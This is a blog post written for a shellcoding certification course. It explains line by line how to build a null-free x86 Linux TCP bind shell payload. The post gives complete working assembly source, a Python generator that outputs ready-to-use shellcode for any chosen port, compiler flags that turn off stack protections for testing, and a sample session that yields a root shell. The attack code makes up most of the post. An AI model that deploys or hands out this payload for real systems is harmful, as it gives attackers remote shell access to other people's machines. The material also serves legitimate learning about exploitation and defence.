---
layout: post
title: Linux TCP Bind Shell (x86)
---

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:*

*http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/*

*Student ID: SLAE - 1187*

*[ASM Source Code for this exercise](https://github.com/fbcsec/slae-assignments/blob/master/1-tcp-bind-shell/tcp-bind-shell.asm)*

*[Python wrapper for shellcode](https://github.com/fbcsec/slae-assignments/blob/master/1-tcp-bind-shell/tcp-bind-shell-wrapper.py)*

Introduction
============

This is the start of a series of articles intended to fulfill the SecurityTube Linux Assembly Expert certification requirements. I won't talk too much about the course itself, but do know that is a fantastic experience for anyone interested in the subject matter. If you're interested in preparing for the OSCE, until SecurityTube produces a course in Shellcoding on Windows, this is the best resource for learning x86 Assembly in the context of security.

In this post I will discuss some of the basics of shellcoding, my development methods, and produce a simple bind shell payload. These articles will assume proficiency with IA32 (x86) Assembly Language. In future posts I will not as explicitly discuss the commands I use to assemble, link and compile my code, but refer readers back to this post.

Setting the Stage
=================

Shellcode is extremely small, purpose built machine code that is used as the payload in binary exploitation scenarios.  The name comes from the idea of spawning 'command shell' or 'command line' from which an exploited system can be controlled. Shellcode is not limited to just getting a shell on a target system, and many shellcode payloads involve simple actions such as adding a user, altering files, retrieving data from a file and returning it in some way, so on and so forth. Shellcode runs in very uncertain conditions, often executed directly off the stack of an exploited application running on a target system. In the classic EIP overwrite stack based buffer overflow our shellcode is executed in this way. Discussing exploitation techniques is beyond the scope of this post, however it's good to understand that the environment our shellcodes will run in can be highly variable, and limited in availible space for code and limited in the opcodes we can use. You will also notice that I go far out of my way to avoid creating null bytes, or `0x00` characters in my code. This is because in a binary exploitation scenario `0x00` characters will prematurely end the string we will often be inserting our shellcode into. This is because 0x00 is almost universally considered the last character in a string.  

### Build Methodology
My build methodology for creating a shellcode is as follows:

1. Craft some shellcode using Assembly language.

2. Assemble the payload using the Netwide Assembler (NASM) into a Linux ELF (in this case, 32 bit)
   * To assemble and link an assembly source
     * `$ nasm -f elf32 -o shellcode_obj.o shellcode_source.asm`
     * `$ ld -m elf_i386 -o shellcode.elf shellcode_obj.o`

3. Use objdump to dump the opcodes produced by the assembler in a format I can insert into a shellcode testing C program.
   * ```$ for i in `objdump -d shellcode.elf | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done ; echo ''```

4. Replace the shellcode[] variable in my C shellcode host.
   * [Template File Located Here](https://github.com/fbcsec/slae-assignments/blob/master/templates/shellcode_host.c)
5. Compile the shellcode host and test.
   * `$ gcc shellcode_host.c -fno-stack-protector -z execstack -m32 -o shellcode_host.elf`
     * The compiler flags here are extremely important, the shellcode host places the shellcode on the stack and then executes it, so if the stack is not executable or if gcc includes stack protectors our code will segfault.
   * `$ ./shellcode_host.elf`

Linux Bind Shell
================

A bind shell payload is simple. When executed, it will listen for connections on a port, and then return a command shell to whoever connects to it. In order to do this we'll need to make a series of system calls to create a socket, bind to it, listen for and accept a connection, and finally execute the command shell.

Let's break this down:

 1. Make a `socket(2)` syscall to get a socket file handle we can use to bind to a port.
 2. Make a `bind(2)` syscall to set the protocol, listen port, and listen address on the file handle returned by the last call.
 3. Make a `listen(2)` syscall to start listening for connections.
 4. Make an `accept(2)` syscall to accept the first incoming connection on our listening socket.
 5. Use the `dup2(2)` syscall to duplicate the stdin, stdout, and stderr file descriptors to the file descriptor returned by `accept(2)`
 6. Use the `execve(2)` syscall to execute `/bin/sh`, which will be using the duplicated file handles from our `dup2(2)` calls.
 
All of these steps require varying consideration to ensure we build and execute our calls using the least amount of space with the most amount of assurance they will be correctly executed.

The syscalls and socketcalls we'll use are documented in various manual pages. These can easily be accessed by running `$ man <manual_section> <name_of_syscall>` on a Linux machine. When I refer to a syscall I will use its name and in parentheses provide the section of the manual it is documented in. For example, `$ man 2 socket` will provide you with documentation on the built in socket() function the kernel provides us. We'll need direct access to the IDs that Linux will use to identify these calls. The Linux syscall table is dynamically generated when the Kernel is compiled, however there are some great references available on-line. My favorite is hosted at [syscalls.kernelgrok.com](https://syscalls.kernelgrok.com/). Making sycalls on Linux in an assembly program is *relatively* straightforward. We simply must provide the syscall id in EAX, and its arguments from left to right in EBX, ECX, EDX, ESI, and EDI. Then fire the syscall interrupt using `int 0x80`.

Let's jump into the shellcode!

### First Steps

I've verbosely commented the full source I've provided below and on Github, however I'd like to go into detail as to exactly what is going on.

```nasm
xor ebx, ebx
mul ebx
```
The first thing we do is zero some registers we'll need to use in the future. XORing a register with itself zeroes it out. We can then MUL that register to zero EAX and EDX. This is a neat trick, MUL stores its result in EAX (low order bits) and EDX (high order bits). And of course anything multiplied by Zero is Zero. So by MULing we multiple whatever is in EAX by zero, thus zeroing out these registers.

### Socket Programming

We need to understand how calls are made to socket() functions in Linux. Socket functions are exposed to us through the `socketcall(2)` syscall. Calling socket functions gets interesting, as unlike calls such as read() and write() where they have their own syscall IDs, socket functions are exposed to us through one syscall. This is syscall 0x66, socketcall(2).

#### `socketcall(2)` and `socket(2)`

socketcall(2) is the call through which we will be accessing the kernel's socket functions. Its arguments are simple, in EBX we will provide it with an integer representing the socket call we wish to make, and in ECX we will provide it with a pointer to an array of arguments to the call. The IDs for socket calls and their arguments can be difficult to find. The syscalls are intended to be used by C programs including specific header files that are dynamically generated and pull their definitions from elsewhere. We wouldn't (and in normal development situations, shouldn't) be just dropping the ID of a call or value directly into our programs, but use constants such as `AF_INET` instead of `2`. But we don't have that luxury in shellcoding and must find the values these definitions really represent to make our calls. The values for these are documented in your Linux kernel source on your Linux machine. Protocol domains are defined in `/usr/src/<your_linux_kernel_version>/include/linux/socket.h`. Socket types are defined in `/usr/src/<your_linux_kernel_version>/include/linux/net.h`. 

Our first step is going to be setting up `socket(2)` to create a socket we can bind to. `socket(2)`'s arguments are simple, we need to provide it with the protocol domain it will use, the type of socket it is to be, and then the protocol. There are many available protocol options, we are concerned with IPv4. 

The arguments we want to pass will be 0x02 for AF_INET (the IPv4 protocol domain), 0x01 for SOCK_STREAM, and finally a 0x00. These need to be in the form of an array we will pass to `socketcall(2)`. To build this array we push the arguments in reverse order to the stack.  
```nasm
 push eax
```
EAX has been zeroed, so we can just PUSH it. 

 ```nasm
 inc ebx
 push ebx
 ```
 
 For `socketcall(2)` we need EBX to be 0x01, the id for the `socket(2)` function. We can also push this to represent SOCK_STREAM in our argument array to socket(2) 
 
 ```nasm
 push byte 0x02
 ```
 
 PUSH AF_INET to the stack and our argument array.
 
 ```nasm
 mov ecx, esp  
 mov al, 0x66  
 int 0x80      
```

For `socketcall(2)` ECX needs to be a pointer to the arguments to the call we'd like to make. Since we've been pushing them to the stack, we can just copy ESP into ECX. Then we fire our syscall. 

#### A note on syscall returns and ERRNO
When a syscall returns, it places its return value in EAX. Each syscall and function has documented on its manpage some of its possible return values. Usually if there is an error, it will return a signed, negative integer. This is referred to as its ERRNO. If you convert the signed output into decimal, it should come out to a small negative number. You can find the error this represents in the following files: `/usr/src/<your_linux_kernel_version>/include/uapi/asm-generic/errno-base.h` and `/usr/src/<your_linux_kernel_version>/include/uapi/asm-generic/errno.h`

It's important to note that you will have been returned a negative value, the 'negativity' of the return is inconsequential, if you've received ERRNO -103 you're looking for ERRNO 103 in the table. You can then look up the error returned in the man page for the call that returned it.

Our first socketcall made above should return, in EAX, a file descriptor that we will use in future calls. 

#### Binding to our socket and handling NULs

In order to bind our shellcode to a port, we must use the file descriptor we've been provided and call `bind(2)` with the protocol, port number we want to listen on, and the IP address we want to listen on. 

```nasm
pop edi      
xchg edi, eax
xchg ebx, eax
mov al, 0x66 
```

To prepare for this call, we'll need to do some housekeeping. We have absolutely no way to predict the size of the file descriptor returned from `socket(2)` and must zero EAX again. We also want to save the file descriptor. Since we know there is a `0x00000002` at the top of the stack, we can use some trickery with XCHG to zero the upper three bytes of EAX. 

First we POP the `0x00000002` from the top of the stack into EDI. Then we swap EDI and EAX. EDI now has our file descriptor which we must save. Next we XCHG EAX with EBX. We know EBX contains a `0x01` from the `socket(2)` syscall, and in addition we want EBX to be `0x02` to call `bind(2)`. So we kill a few birds with a few stones in this preparation. We also move the `socketcall(2)` ID into AL. 

Next we start preparing the arguments for `bind(2)`. This function requires the file descriptor we got from `socket(2)`, a special data structure called `sockaddr` which is documented in the man page for `ip(7)`, and the size of this structure.

I'll spare you interpreting the documentation, the structure requires two bytes of protocol family information (this is `0x02` for AF_INET), two bytes of port information in network byte order (we need to reverse the endinness of the port we provide, this is easier than it sounds), and four bytes of IP address, again in network byte order. We're going to push these in reverse order to the stack to build this structure.

```nasm
push edx
```

In our case we want to listen on all interfaces, this is a special IP address of all zeroes and simplifies having to determine the available IP addresses on the system that we could bind to. We can simply get this by PUSHing EDX which should still be zeroed. 


##### Handling null bytes in the port number

If our port number has no null bytes, we can simply PUSH it to the stack. 

```nasm
push word 0x5c11
```

This represents port 4444. Notice that I changed the endianness of 4444's hexadecimal representation. It would normally be `0x115c` however we must use network byte order. In addition, because we're pushing to the stack we'll need to reverse the bytes. For us this just means swapping around the two hex bytes to `0x5c11`. When we push it onto the stack in this form its order will be correct. 

Sometimes we'll want to use a port number that will contain null bytes. For example, if we wish to bind to port 43776 we will need to push `0xAB00` to the stack. If we wanted connect on a port below 256 we'll also need to adjust how we push the port number. Port 5 is represented as `0x0005`, that first null byte is not acceptable. 

If our port contains a null byte, depending on its position in the port, we have to handle it. For a port below 256, we must do something like this:

```nasm
add dh, 0x05
push word dx
xor edx, edx
```

Here we add  `0x05` to DH (remember network byte order) and then push DX (which is the lower two bytes of EDX) to the stack. This gets the null byte we want into the structure without having to include one in our shellcode. 

Alternatively, for a port number like 43776 where there is a trailing null, we can do something similar.

```nasm
add dl, 0xAB
push word dx
xor edx, edx
```   

Either way, once the port number is on the stack, we just need to push the protocol domain (0x02) which is stored in EBX. We only push two bytes by doing PUSH WORD BX so it stays aligned with the struct we've created. In both cases we'll also XOR EDX with itself to ensure it's back to zero, as we'll use it in the future.

```nasm
push word bx
mov ecx, esp
```
We also save a pointer to the struct we've just created on the stack in ECX.

```nasm
push 0x10
push ecx
push edi 
mov ecx, esp
int 0x80

```
Finally we build the arguments for `bind(2)` like we did for `socket(2)` and make the syscall. We push `0x10` which represents the length of the struct we created, push ECX into which we moved the pointer to the struct, push EDI which contains the file descriptor for our socket. Then we move a pointer to these arguments into ECX and fire the syscall. 

This should return zero in EAX to indicate success. 

#### `listen(2)` and `accept(2)`

Now that we've bound to our desired port, we can begin listening and accepting connections. In this case, we'll simply accept the first incoming connection and present our shell over it. 

`listen(2)` needs the file descriptor of the socket we created and a backlog argument. 

 ```nasm
mov [ecx + 0x04], edx
add bl, 0x02         
mov al, 0x66
int 0x80
```

We're going to re-use the array of arguments from the call to `bind(2)`. We will need to zero out its second element as the backlog argument. The backlog argument represents the number of connections that are allowed to wait for us to process them. We don't really care about this argument and sending `0x00` as the backlog will just set it to unlimited. When we fire this call our shellcode will stop until something connects to it. We also need to adjust ECX, incrementing it by one isn't enough as the next ID after bind is `connect(2)` with the one after being `listen(2)`. 

Next we will need to accept a connection, which we'll do by calling `accept(2)`. 

```nasm
inc ebx
mov al, 0x66
int 0x80
```

`accept(2)` requires little work to call. It requires the file descriptor as its first argument it is documented to require another struct similar to the sockaddr we created earlier for `bind(2)` but representative of the client connecting to us. Finally, the length of this struct. We will continue re-using the arguments currently pointed to by ECX. This call is lenient, and we can pass it a NULL for its second argument, and leave the last argument alone. All we must do is increment EBX, the socket call ID, move the `socketcall(2)` syscall id into AL, and make the call. 

This will return, in EAX, a new file descriptor that represents the connection we've accepted. 
     
#### Duplicating stdin, stdout, and stderr

Once the connection has been made our next goal is to return a command shell over it. In order to do this, we must duplicate stdin, stdout, and stderr to the file descriptor returned by `accept(2)`. We are fortunately now done with socket programming and are returning to using standard syscalls.

`dup2(2)` takes as arguments a file descriptor of our choice and a 'newfd', which for our purposes is the file descriptor for stdin, stdout, or stderr. These are file descriptors 0, 1, and 2 respectively.  We could manually set up these calls and execute them manually one by one, but I've elected to make the calls in a loop. 

```nasm
     xchg eax, ebx 
     mov ecx, edx  
     mov cl, 0x02  
 ```
 
 First some setup. EBX needs to hold the file descriptor of the open connection so we exchange it with EAX. This also ensures that EAX's high order bytes are zeroed so we can set the syscall ID. Again we have no guarantee what file descriptor is returned, so we need to ensure it's emptied for the syscall. You'll see we XOR EAX, EAX at the beginning of the dup2_loop, as `dup2(2)` also returns a file handle. 
 
 ```nasm
 dup2_loop:
     xor eax, eax
     mov al, 0x3f                ; move the syscall into eax
     int 0x80      
     dec ecx       
     jns dup2_loop 
```

Here we actually call `dup2(2)`. We put into ECX the value of stderr (2) and decrement it every loop so the next loops call `dup2(2)` with stdout and finally stdin. JNS (Jump if not signed) dup2_loop is what controls this loop. If, when we decrement ECX, it has not become negative, we loop back. If it has, we pass over it. In this case, we go over it into our `execve(2)` call.

#### Starting a Command Shell with `execve(2)` 

Now that we've redirected the standard file handles for our environment to the file descriptor of our connection, we just need to execute our shell. `execve(2)` requires three arguments. First, a pointer to a string that contains the path of the executable to invoke. This string must be null terminated. Second, a pointer to the start of an array that represents the argv to start the program with. The first element of this array must be a pointer to the string we created for the first argument to `execve(2)`. The final thing we need is a pointer to an array of environment variables to invoke the program with.

 Again we'll build these requirement on the stack. First we'll get the path to our binary down. 
 
 ```nasm
push edx       
push 0x68732f2f
push 0x6e69622f
```

EDX should still be zeroed, so we push this first to take care of the null terminator we need at the end of the executable path. Then we PUSH the path in reverse order, in little endian format. This means we've got to push the end of the string first and the bytes must be reversed as well. To aid in this, I've created a small utility that produces what we need to push for us. [It can be found here.](https://github.com/fbcsec/slae-assignments/blob/master/tools/reverse.py)

To illustrate:
```
hs// : 0x68732f2f
nib/ : 0x6e69622f
```

Notice that I've added an extra `/`. This is because the path did not cleanly fit into DWORDs for pushing onto the stack. Fortunately you can have an arbitrary number of slashes next to each other. So `///bin////sh` resolves to the same path as `/bin/sh`. 

Our string is now on the stack.

```nasm
mov ebx, esp
```

EBX needs to contain the pointer to this string, so we move ESP, which currently points to it, into EBX. 
```nasm
push edx       
mov edx, esp
```

We turn our attention to the envp array. We can make this array a single item with just a null, but we must still provide `execve(2)` with a pointer to it. So we PUSH EDX, which should still be nulled, and then move into EDX ESP. 


```nasm
push ebx       
mov ecx, esp   
mov al, 0x0b   
int 0x80
```

We take care of the argv array by pushing the address to the `/bin//sh` string to the stack and then moving esp (now a pointer to the argv array)to ecx. Finally setting the `execve(2)` syscall id in EAX and firing our final syscall. Anyone who connects to our bound port using something like `ncat` or `telnet` should be presented with a shell. 

It would look something like this:   

```
$ ncat -nv 172.16.1.127 4444
Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Connected to 172.16.1.127:4444.
id
uid=0(root) gid=0(root) groups=0(root)
```

##Final Notes

Below is the full and commented source for the shellcode plus a python wrapper I wrote to set the port in the shellcode. It should be able to handle generating a payload that binds to any valid port number (1-65535).  

### Full Source
**[ASM source on Github](https://github.com/fbcsec/slae-assignments/blob/master/1-tcp-bind-shell/tcp-bind-shell.asm)**

```nasm
; Simple x86 Linux TCP Bind Shell
; Author: @fbcsec
; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
; Student ID: SLAE - 1187

global _start

section .text

_start:

; Set the stage - Zero EAX, EBX, and EDX
    xor ebx, ebx
    mul ebx         ; MUL stores high order bits in EDX and low order bits in EAX.
                    ; so by MULing with a register that's already zero, we zero EAX and EDX.

; socket(AF_INET, SOCK_STREAM, 0)
; Get an initial file descriptor (fd) to use for further network calls.
    push eax ; socket int protocol (0x00)
    inc ebx  ; socketcall int call (0x01)
    push ebx ; socket type (SOCK_STREAM (0x01))
    push byte 0x02  ; socket domain (AF_INET (0x02))
    mov ecx, esp    ; move pointer to socket arguments into ecx
    mov al, 0x66    ; socketcall syscall id
    int 0x80        ; fire syscall
; A file descriptor for this socket is returned in EAX.

; bind(FD, *sockaddr, addrlen (0x10))
; Bind to a port number using the socket we've created so we can listen for connections.

    pop edi             ; EDI is now 0x02
    xchg edi, eax       ; sockfd is now in edi
    xchg ebx, eax       ; EAX now contains 0x00000002 (all but al is zero)
    mov al, 0x66        ; EAX now contains 0x00000066
                        ; This block is because we can't predict the file descriptor returned in EAX and must ensure all of EAX's bytes higher than AL are zeroed.

; build sockaddr struct on stack
; sockaddr's format: {word family (AF_INET), word port, dword ip address}
; IP and port number must be in network byte (big endian) order.
; I.E., port 4444 is 0x5c11 normally, in network byte order it's 0x5c11.

    push edx            ; push ip address to bind to (0x00000000 for all addresses (or INADDR_ANY)

; Writing the port number into our struct can be tricky.
; If the hex for our port number contains a NUL (0x00) we need to alter the code to avoid this NUL.
; If the port number to bind to contains no NULs we can simply do this:
    push word 0x5c11 ; PUSH '4444' in network byte order.

; If we want to bind to a port below 256 we'll need to use an empty register to build the numb
;(this is inadvisable, only root can bind to addresses under 1024)
    ;add dh, 0x05        ; Set up port number in network byte order in a register...
    ;push word dx        ; and then PUSH it
    ;xor edx, edx        ; zero EDX again

; If we wish to use a port number such as 43776, which in hex is AB00, we need to do something similar to the above.
    ;add dl, 0xAB        ; set up 43776 in network byte order in a register...
    ;push word dx        ; and then PUSH it
    ;xor edx, edx


    push word bx        ; push protocol family (0x02 for AF_INET)

; build bind() arguments and fire syscall
    mov ecx, esp
    push 0x10 ; push sockaddr struct length
    push ecx  ; push pointer to sockaddr
    push edi  ; push file descriptor
    mov ecx, esp ; move pointer to syscall arguments into ecx
    int 0x80

; listen(fd, int backlog)
; Begin listening for connections on the port we've bound.
    mov [ecx + 0x04], edx ; We re-use the bind argv array, eax is 0x00 from successful bind() return value. The backlog should be zero
    add bl, 0x02          ; set syscall listen() (4)
    mov al, 0x66
    int 0x80

; accept(int sockfd, null, 0x10)
; Accept the first incoming connection to our bound port.
; Despite what the man pages for accept(2) would have you beleive, this call is not picky about the second two arguments.
; We can just re-use the same arguments from the last call, still in ECX.
    inc ebx
    mov al, 0x66
    int 0x80
; This returns a new file descriptor for us representing the connection.

; dup2(connection_fd, fd_to_redirect)
; duplicate stderr, stdin, and stdout to connection file handle
; This lets us execve whatever we want and have its input, output, and errors flowing over the connection.

    xchg eax, ebx               ; move connection fd into ebx (old fd)
    mov ecx, edx                ; edx should still be zeroed, move it into ecx
    mov cl, 0x02                ; start at 0x02 (stderr)

dup2_loop:
    xor eax, eax
    mov al, 0x3f                ; move the syscall into eax
    int 0x80                    ; fire syscall
    dec ecx                     ; decrementing ecx will make it stdout after the first loop and stdin the last
    jns dup2_loop               ; if ecx turns negative, don't jmp

; execve /bin/sh

    push edx                    ; push zeroes to terminate /bin//sh string
    push 0x68732f2f             ; push /bin//sh to stack
    push 0x6e69622f
    mov ebx, esp                ; esp is a pointer to the /bin//sh string, store this in ebx
    push edx                    ; push a null for envp and to end the argv array
    mov edx, esp                ; store pointer to envp array in edx
    push ebx                    ; argv is an array of pointers to strings, /bin//sh must be the first argument, so we push its address to the stack.
    mov ecx, esp                ; store pointer to argv array in ecx
    mov al, 0x0b                ; set up syscall id and fire interrupt
    int 0x80

; At this point we should have delivered a shell to the first person connecting on our bound port.

```

### Wrapper Script
*[Wrapper on Github](https://github.com/fbcsec/slae-assignments/blob/master/1-tcp-bind-shell/tcp-bind-shell-wrapper.py)*

```python
#!/usr/bin/env python3
"""
x86 Linux TCP Bindshell Generator
Handles portnumbers which have NULs in their hex representation
Usage: this_script.py <port_to_bind>
Author: fbcsec
This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
Student ID: SLAE - 1187
"""
from sys import argv

if len(argv) != 2:
    print('Usage: %s <port_to_bind>')
    raise SystemExit

port = int(argv[1])

if port > 65535:
    print('ERROR: Port number cannot be greater than 65535.')
    raise SystemExit

if port == 0:
    print('ERROR: Port 0 is not usable.')
    raise SystemExit

# Zero padded port in hexadecimal
hexport = "{0:#0{1}x}".format(port, 6)

# If port is below 256
if hexport[2:4] == '00':
    HANDLE_PORT_NUMBER = ("\x80\xc6" +  # add dh <port number low bytes>
                          bytearray.fromhex(hexport[4:6]).decode('iso-8859-1') +
                          "\x66\x52" +  # push word dx
                          "\x31\xd2")  # xor edx, edx

elif hexport[4:6] == '00':
    HANDLE_PORT_NUMBER = ("\x80\xc2" +  # add dl <port number high bytes>
                             bytearray.fromhex(hexport[2:4]).decode('iso-8859-1') +
                             "\x66\x52" +  # push word dx
                             "\x31\xd2")  # xor edx, edx
else:
    HANDLE_PORT_NUMBER = ("\x66\x68" +  # push word <big endian port number>
                          bytearray.fromhex(hexport[2:4]).decode('iso-8859-1') +
                          bytearray.fromhex(hexport[4:6]).decode('iso-8859-1'))

shellcode = bytearray("\x31\xdb"  # xor ebx, ebx
                      "\xf7\xe3"              # mul ebx
                      "\x50"                  # push eax
                      "\x43"                  # inc ebx
                      "\x53"                  # push ebx
                      "\x6a\x02"              # push 0x02
                      "\x89\xe1"              # mov ecx, esp
                      "\xb0\x66"              # mov al, 0x66
                      "\xcd\x80"              # int 0x80
                      "\x5f"                  # pop edi
                      "\x97"                  # xchg edi, eax
                      "\x93"                  # xchg ebx, eax
                      "\xb0\x66"              # mov al, 0x66
                      "\x52"

                      + HANDLE_PORT_NUMBER +

                      "\x66\x53"              # push bx
                      "\x89\xe1"              # mov ecx, esp
                      "\x6a\x10"              # push 0x10
                      "\x51"                  # push ecx
                      "\x57"                  # push edi
                      "\x89\xe1"              # mov ecx, esp
                      "\xcd\x80"              # int 0x80
                      "\x89\x51\x04"          # mov dword ptr [ecx + 0x04], edx
                      "\x80\xc3\x02"          # mov bl, 0x02
                      "\xb0\x66"              # mov al, 0x66
                      "\xcd\x80"              # int 0x80
                      "\x43"                  # inc ebx
                      "\xb0\x66"              # mov al, 0x66
                      "\xcd\x80"              # int 0x80
                      "\x93"                  # xchg bx, eax
                      "\x89\xd1"              # mov ecx, edx
                      "\xb1\x02"              # mov cl, 0x02
                      "\x31\xc0"              # xor eax, eax
                      "\xb0\x3f"              # mov al, 0x3f
                      "\xcd\x80"              # int 0x80
                      "\x49"                  # dec ecx
                      "\x79\xf9"              # jns short [esp - 5]
                      "\x52"                  # push edx
                      "\x68\x2f\x2f\x73\x68"  # push 0x68732f2f
                      "\x68\x2f\x62\x69\x6e"  # push 0x6e69622f
                      "\x89\xe3"              # mov ebx, esp
                      "\x52"                  # push edx
                      "\x89\xe2"              # mov edx, esp
                      "\x53"                  # push ebx
                      "\x89\xe1"              # mov ecx, esp
                      "\xb0\x0b"              # mov al, 0x0b
                      "\xcd\x80",             # int 0x80
                      'iso-8859-1')

final_shellcode = ''

for i in shellcode:
    final_shellcode += '\\x'
    final_shellcode += '%02x' % (i & 0xff)

print("x86 Linux TCP Bind Shell on port " + str(port))
print("Length: " + str(len(shellcode)) + "\n")
print("unsigned char shellcode[] = \"" + final_shellcode + "\";")
```